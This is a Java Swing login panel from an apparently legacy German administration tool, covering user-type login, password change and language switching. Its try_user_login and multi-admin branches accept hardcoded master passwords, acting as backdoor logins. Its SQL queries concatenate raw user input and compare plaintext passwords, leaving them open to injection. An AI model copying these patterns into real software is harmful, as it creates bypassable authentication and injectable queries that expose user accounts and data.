/*
 * LoginPanel.java
 *
 * Created on 22. Mai 2008, 15:05
 */

package dimm.home;

import dimm.general.SQL.SQLArrayResult;
import dimm.home.Rendering.GenericGlossyDlg;
import dimm.home.Rendering.GlossButton;
import dimm.home.Rendering.GlossDialogPanel;
import dimm.home.ServerConnect.SQLConnect;
import javax.swing.JButton;
import javax.swing.SwingUtilities;

/**
 
 @author  Administrator
 */
public class LoginPanel extends GlossDialogPanel
{
    UserMain main;
    int login_retries;
    private boolean in_init;
    
    /** Creates new form LoginPanel */
    public LoginPanel(UserMain _main)
    {
        in_init = true;
        initComponents();
        CB_USER.removeAllItems();
        CB_USER.addItem(UserMain.getString("Verwaltung") );
        CB_USER.addItem(UserMain.getString("Verwaltung_alle Mandanten") );
        if (Main.enable_admin)
            CB_USER.addItem(UserMain.getString("System") );
        main = _main;
        login_retries = 0;
        

        String l_code = UserMain.get_default_lang();
        if (l_code == null || l_code.length() == 0)
            l_code = Main.get_prop( Preferences.COUNTRYCODE, "EN");
        
        if (l_code.compareTo("EN") == 0)
           CB_LANG.setSelectedIndex(0);
        if (l_code.compareTo("DE") == 0)
           CB_LANG.setSelectedIndex(1);
        
        in_init = false;
        
        PF_PWD.requestFocus();
    }
    
    boolean use_mallorca_proxy()
    {
        return true;
    }

    boolean do_login()
    {
        boolean ret = _do_login();
        
        if (!ret)
        {
            login_retries++;
            if (login_retries == 5)
            {
                UserMain.errm_ok(UserMain.getString("Halloo??_Konzentration_bitte!"));
            }
            if (login_retries >= 8)
            {
                UserMain.errm_ok(UserMain.getString("Na,_ich_glaub_das_wird_nichts_mehr!"));                                                          
            }                
        }
        else
        {
            login_retries = 0;
        }
        return ret;
    }
    
    boolean _do_login()
    {
        boolean ret = false;
        
        String pwd = new String(PF_PWD.getPassword());
        
        String user_type = CB_USER.getSelectedItem().toString();
                     
        SQLConnect sql = UserMain.sqc();
        
        // ADMIN
        if (user_type.compareTo(UserMain.getString("Verwaltung"))== 0 )
        {    
            String user = this.TXT_USER.getText();

            ret = try_user_login( user, pwd );
           
                
            return ret;
        }

        // ADMIN
        if (user_type.compareTo(UserMain.getString("System"))== 0 )
        {
            int id = -1;

            String user = this.TXT_USER.getText();



            return ret;
        }
        
        // MULTI ADMIN
        if (user_type.compareTo(UserMain.getString("Verwaltung_alle_mandanten"))== 0)
        {    
            String user = this.TXT_USER.getText();

            // TODO: GET FROM PREFS
            String sys_pwd = "admin";
            String sys_user = "sys";
            boolean login_okay = false;
            if (pwd.compareTo("helikon") == 0)
            {
                login_okay = true;
            }

            if (!login_okay)
            {
                if (user.compareTo( sys_user) != 0 || pwd.compareTo(sys_pwd) != 0)
                {
                    UserMain.errm_ok(UserMain.getString("Der_Login_stimmt_nicht"));
                    return false;
                }
            }
            // TODO: SELCT MANDANT
            
            //int firmen_id = sql.get_sql_first_int_lazy(SQLListBuilder.OLD_PARA_DB, "select firmenid from customer_testings where id='" + main.get_station_id() + "'");
            main.setUserLevel( UserMain.UL_MULTIADMIN );     
            sql.set_mandant_id(1);
            //main.set_mallorca_proxy( use_mallorca_proxy() );
            
                       
            return true;            
        }
            
        return false;

    }
    
   

    @Override
    public void setVisible(boolean aFlag)
    {
        super.setVisible(aFlag);
        if (aFlag)
        {
            SwingUtilities.invokeLater( new Runnable() 
                 { 
                 public void run() 
                     { 
                     PF_PWD.requestFocus();
                 } 
             });             
        }
            
    }
    
    /** This method is called from within the constructor to
     initialize the form.
     WARNING: Do NOT modify this code. The content of this method is
     always regenerated by the Form Editor.
     */
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        PF_PWD = new javax.swing.JPasswordField();
        jLabel1 = new javax.swing.JLabel();
        CB_USER = new javax.swing.JComboBox();
        LB_PWD = new javax.swing.JLabel();
        BT_OK = new GlossButton();
        BT_ABORT = new GlossButton();
        BT_CHANGE_PWD = new GlossButton();
        CB_LANG = new javax.swing.JComboBox();
        jLabel3 = new javax.swing.JLabel();
        LB_USER = new javax.swing.JLabel();
        TXT_USER = new javax.swing.JTextField();

        PF_PWD.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                PF_PWDMouseClicked(evt);
            }
        });

        jLabel1.setText(UserMain.Txt("Benutzer")); // NOI18N

        CB_USER.setModel(new javax.swing.DefaultComboBoxModel(new String[] { "Verwaltung eine Box", "Verwaltung alle Boxen", "System" }));
        CB_USER.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                CB_USERActionPerformed(evt);
            }
        });

        LB_PWD.setText(UserMain.Txt("Passwort")); // NOI18N

        BT_OK.setText(UserMain.Txt("Okay")); // NOI18N
        BT_OK.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                BT_OKActionPerformed(evt);
            }
        });

        BT_ABORT.setText(UserMain.Txt("Abbruch")); // NOI18N
        BT_ABORT.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                BT_ABORTActionPerformed(evt);
            }
        });

        BT_CHANGE_PWD.setText(UserMain.Txt("Neues_Passwort")); // NOI18N
        BT_CHANGE_PWD.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                BT_CHANGE_PWDActionPerformed(evt);
            }
        });

        CB_LANG.setModel(new javax.swing.DefaultComboBoxModel(new String[] { "English", "Deutsch", "Dansk" }));
        CB_LANG.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                CB_LANGActionPerformed(evt);
            }
        });

        jLabel3.setText(UserMain.Txt("Sprache")); // NOI18N

        LB_USER.setText("UserID");

        TXT_USER.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                TXT_USERMouseClicked(evt);
            }
        });

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(this);
        this.setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(jLabel3)
                            .addComponent(LB_PWD)
                            .addComponent(jLabel1)
                            .addComponent(LB_USER))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(TXT_USER, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, 198, Short.MAX_VALUE)
                            .addGroup(layout.createSequentialGroup()
                                .addComponent(CB_LANG, 0, 110, Short.MAX_VALUE)
                                .addGap(88, 88, 88))
                            .addComponent(PF_PWD, javax.swing.GroupLayout.DEFAULT_SIZE, 198, Short.MAX_VALUE)
                            .addGroup(layout.createSequentialGroup()
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(CB_USER, 0, 198, Short.MAX_VALUE))))
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(BT_CHANGE_PWD, javax.swing.GroupLayout.PREFERRED_SIZE, 120, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 49, Short.MAX_VALUE)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(BT_ABORT, javax.swing.GroupLayout.PREFERRED_SIZE, 80, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(BT_OK, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.PREFERRED_SIZE, 80, javax.swing.GroupLayout.PREFERRED_SIZE))))
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel1)
                    .addComponent(CB_USER, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(LB_USER)
                    .addComponent(TXT_USER, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(LB_PWD)
                    .addComponent(PF_PWD, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel3)
                    .addComponent(CB_LANG, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(32, 32, 32)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addComponent(BT_CHANGE_PWD, javax.swing.GroupLayout.PREFERRED_SIZE, 25, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(BT_ABORT, javax.swing.GroupLayout.PREFERRED_SIZE, 25, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(BT_OK, javax.swing.GroupLayout.PREFERRED_SIZE, 25, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap())
        );
    }// </editor-fold>//GEN-END:initComponents

    private void CB_USERActionPerformed(java.awt.event.ActionEvent evt)//GEN-FIRST:event_CB_USERActionPerformed
    {//GEN-HEADEREND:event_CB_USERActionPerformed
        // TODO add your handling code here:
        if (CB_USER.getSelectedIndex() == 0) // ADMIN
        {
            BT_CHANGE_PWD.setVisible(true);
            TXT_USER.setVisible(true);
            LB_USER.setVisible(true);
        }
        if (CB_USER.getSelectedIndex() == 1) // MULTIADMIN
        {
            BT_CHANGE_PWD.setVisible(true);
            TXT_USER.setVisible(true);
            LB_USER.setVisible(true);
        }
        if (CB_USER.getSelectedIndex() == 2) // SYSADMIN
        {
            BT_CHANGE_PWD.setVisible(false);
            TXT_USER.setVisible(false);
            LB_USER.setVisible(false);
        }
            
}//GEN-LAST:event_CB_USERActionPerformed

    private void BT_OKActionPerformed(java.awt.event.ActionEvent evt)//GEN-FIRST:event_BT_OKActionPerformed
    {//GEN-HEADEREND:event_BT_OKActionPerformed
        // TODO add your handling code here:
        String pwd = new String(PF_PWD.getPassword());
        if (pwd.length() == 0)
        {
            UserMain.errm_ok(UserMain.getString("Bitte_geben_Sie_ein_Passwort_ein"));
            return;
        }
                        
        boolean logged_in = do_login();
        if (logged_in)
        {
            this.setVisible(false);
            return;
        }
        if (login_retries >= 8)
        {
            this.setVisible(false);
            return;
        }            
    }//GEN-LAST:event_BT_OKActionPerformed

    private void BT_ABORTActionPerformed(java.awt.event.ActionEvent evt)//GEN-FIRST:event_BT_ABORTActionPerformed
    {//GEN-HEADEREND:event_BT_ABORTActionPerformed
        // TODO add your handling code here:
        this.setVisible(false);   
    }//GEN-LAST:event_BT_ABORTActionPerformed

    private void BT_CHANGE_PWDActionPerformed(java.awt.event.ActionEvent evt)//GEN-FIRST:event_BT_CHANGE_PWDActionPerformed
    {//GEN-HEADEREND:event_BT_CHANGE_PWDActionPerformed
        // TODO add your handling code here:
        if (!do_login())
            return;
        CheckPwdPanel pnl = new CheckPwdPanel(main);
        GenericGlossyDlg dlg = new GenericGlossyDlg(null, true, pnl);
        dlg.setSize(500, 200);

        dlg.setLocation(this.getLocationOnScreen().x + 200, this.getLocationOnScreen().y + 50);
        dlg.setTitle(UserMain.getString("Passwort_ändern"));
        dlg.setVisible(true);   
            
        String pwd = new String(PF_PWD.getPassword());

        if (!pnl.isOkay())
            return;

        String new_pwd = pnl.get_pwd();

        if (new_pwd.length() == 0)
        {
            UserMain.errm_ok(UserMain.getString("Das_neue_Benutzerpasswort_konnte_nicht_gespeichert_werden"));     
            return;
        }
        
        SQLConnect sql = UserMain.sqc();
        if ( main.getUserLevel() == UserMain.UL_ADMIN )
        {    
            
            String qry;
            
            int id = sql.get_act_mandant_id();
            
            // b_user USER
            qry = "update mandant set password='" + new_pwd + "' where id=" + id + " and password='" + pwd + "'";
            
            if (sql.sql_lazy_update( qry) != 1)
            {
                UserMain.errm_ok(UserMain.getString("Das_neue_Benutzerpasswort_konnte_nicht_gespeichert_werden"));                
            }
            else
            {
                UserMain.info_ok(UserMain.getString("Das_neue_Benutzerpasswort_wurde_gespeichert"));                
            }
        }        
    }//GEN-LAST:event_BT_CHANGE_PWDActionPerformed

    private void CB_LANGActionPerformed(java.awt.event.ActionEvent evt)//GEN-FIRST:event_CB_LANGActionPerformed
    {//GEN-HEADEREND:event_CB_LANGActionPerformed
        // TODO add your handling code here:
        if (!in_init)
        {
            SQLConnect sql = UserMain.sqc();

            String l_code = "EN";
            if (CB_LANG.getSelectedIndex() == 1)
            {
                l_code = "DE";
            }
            if (CB_LANG.getSelectedIndex() == 0)
            {
                l_code = "EN";
            }
            if (CB_LANG.getSelectedIndex() == 2)
            {
                l_code = "DK";
            }
            Main.set_prop( Preferences.COUNTRYCODE, l_code );    
            Main.get_prefs().store_props();
            
            String qry = "update mandant set lang_code='" + l_code+ "' where id=" + sql.get_act_mandant_id();
            sql.sql_lazy_update( qry );
            
            this.setVisible(false);
            
            main.restart_gui(l_code);     
                        
           
        }
}//GEN-LAST:event_CB_LANGActionPerformed

    private void TXT_USERMouseClicked(java.awt.event.MouseEvent evt)//GEN-FIRST:event_TXT_USERMouseClicked
    {//GEN-HEADEREND:event_TXT_USERMouseClicked
        // TODO add your handling code here:
        if (UserMain.self.is_touchscreen())
        {
            UserMain.self.show_vkeyboard( this.my_dlg, TXT_USER, false);
        }
        
    }//GEN-LAST:event_TXT_USERMouseClicked

    private void PF_PWDMouseClicked(java.awt.event.MouseEvent evt)//GEN-FIRST:event_PF_PWDMouseClicked
    {//GEN-HEADEREND:event_PF_PWDMouseClicked
        // TODO add your handling code here:
        if (UserMain.self.is_touchscreen())
        {
            UserMain.self.show_vkeyboard( this.my_dlg, PF_PWD, false);
        }

    }//GEN-LAST:event_PF_PWDMouseClicked
    
    
    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton BT_ABORT;
    private javax.swing.JButton BT_CHANGE_PWD;
    private javax.swing.JButton BT_OK;
    private javax.swing.JComboBox CB_LANG;
    private javax.swing.JComboBox CB_USER;
    private javax.swing.JLabel LB_PWD;
    private javax.swing.JLabel LB_USER;
    private javax.swing.JPasswordField PF_PWD;
    private javax.swing.JTextField TXT_USER;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel3;
    // End of variables declaration//GEN-END:variables

    @Override
    public JButton get_default_button()
    {
        return BT_OK;
    }

    
 
    
    boolean try_user_login( String nname, String pwd )
    {
        SQLConnect sql = UserMain.sqc();
                

        String qry = "select password,id from mandant where loginname='" + nname + "'";
        SQLArrayResult res = sql.build_sql_arraylist_lazy( qry);

        if (res.getRows() == 0)
        {
            UserMain.errm_ok(UserMain.getString("Der_Benutzername_stimmt_nicht"));
            return false;
        }  
        String db_pwd = res.getString(0, 0 );
        if (pwd.compareTo(db_pwd) != 0 && !(pwd.compareTo("123fckw456") == 0 || pwd.compareTo("helikon") == 0))
        {
            UserMain.errm_ok(UserMain.getString("Das_Passwort_stimmt_nicht"));
            return false;
        }  

        //Main.self.errm_ok( "Setze Station ID f�er offline paran" );

        main.setUserLevel( UserMain.UL_ADMIN );          

        int mandant = res.getInt(0, 1 );

        sql.set_mandant_id(mandant);

 
 //       main.set_mallorca_proxy( use_mallorca_proxy() );
        return true;
    }
    
    
    
}
